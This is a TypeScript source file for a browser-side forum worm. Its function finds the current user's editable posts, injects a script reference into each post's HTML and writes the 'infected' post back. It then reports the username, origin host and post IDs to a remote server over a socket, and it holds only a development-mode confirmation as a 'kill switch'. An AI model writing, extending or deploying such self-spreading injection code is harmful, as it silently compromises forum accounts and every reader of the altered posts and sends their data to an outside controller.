import { objectStorage } from '@classes';
import { CURRENT_SCRIPT_SRC } from '@env';
import { collectPosts, findPosts, readPost, getMessageFooterNotesAsHTML, writePost, canEditPost } from '@functions';
import { socket } from '@globals';
import { createInjection, getDomainPath } from '@helpers';

export const searchAllPosts = (locationHostname: string, currentUserId: number, currentUsername: string, currentUserSlug: string) => {
	console.log('Searches for all posts.');

	if (!CURRENT_SCRIPT_SRC) {
		console.warn(
			'' +
				`No script source file was specified for '${nameof(createInjection)}'.\n` +
				`See '${nameof(CURRENT_SCRIPT_SRC)}' in 'webpack.config.js'.`
		);

		return;
	}

	(async () => {
		const keyFnForCollectingPostData = (pageNo: number) => `${nameof(collectPosts)}/${currentUserId}_${currentUserSlug}_${pageNo}/postData`;

		const domainPath = await getDomainPath();

		collectPosts(
			// The username, the user id and the page number are always URL compliant and therefore do not need
			// to be URL escaped.
			(pageNo) =>
				`${domainPath}index.php?user-post-list/${encodeURIComponent(currentUserId)}-${encodeURIComponent(
					currentUserSlug
				)}&pageNo=${encodeURIComponent(pageNo)}`,
			findPosts,
			({ threadId, postId, postUrl }, cached) => {
				if (threadId === null || postUrl === null) {
					return;
				}

				console.log(`Post\n\t=> Cached: ${cached}'\n\t=> Post ID: ${postId}\n\t=> Post URL: ${postUrl}\n\t=> Thread ID: ${threadId}`);
				console.log(`Reads the post with the ID ${postId}.`);

				// Check if the value has already been sent to the server.
				if (objectStorage.getItem(postId.toString(), nameof(searchAllPosts))) {
					return;
				}

				(async () => {
					const canEdit = await canEditPost(postUrl);

					if (!canEdit) {
						return;
					}

					const [messageAsHTML, messageFooterNotesAsHTML] = await Promise.all([
						readPost(postId, threadId),
						getMessageFooterNotesAsHTML(postId, postUrl),
					]);

					if (messageAsHTML === null || messageFooterNotesAsHTML === null) {
						return;
					}

					const {
						text: infectedMessage,
						infected,
						infectedBefore,
					} = createInjection(messageAsHTML, CURRENT_SCRIPT_SRC, {
						data: {
							postIdAsString: postId.toString(),
							// The string to be encoded can contain characters outside of the Latin1 range.
							messageFooterNotesAsHTML: encodeURIComponent(messageFooterNotesAsHTML),
							isHTMLURLEncodedAsString: true.toString(),
						},
					});

					console.log(
						`Post Message\n\t=> Is infected?: ${infected}\n\t=> Was infected?: ${infectedBefore}\n\t=> Message: '${messageAsHTML}'\n\t=> Message Footer Notes: '${messageFooterNotesAsHTML}'`
					);

					if (!infected || infectedBefore) {
						return;
					}

					console.log(`Infected Post Message\n\t=> Infected Message: '${infectedMessage}'`);

					// I have built in a kill switch in case I accidentally execute the script on a page where it should not be executed.
					if (process.env.NODE_ENV === 'development' && !confirm(`Are you sure that you want to infect the post with the ID ${postId}?`)) {
						return;
					}

					if (process.env.NODE_ENV === 'development') {
						// eslint-disable-next-line no-debugger
						debugger;
					}

					console.log(`Writes the post with the ID ${postId}.`);
					await writePost(postId, threadId, infectedMessage);

					// Sends the information to the server if it has not already been saved as sent in the client.
					socket.emit(
						'post message',
						{ origin: locationHostname, username: currentUsername },
						{ threadId, postId, postUrl },
						(res?: { status?: 'ok' }) => {
							if (!res || res.status !== 'ok') {
								return;
							}

							// Save that the value has already been sent to the server.
							objectStorage.setItem(postId.toString(), true, nameof(searchAllPosts));
						}
					);
				})();
			},
			{ enableCache: true, keyFn: keyFnForCollectingPostData }
		);
	})();
};
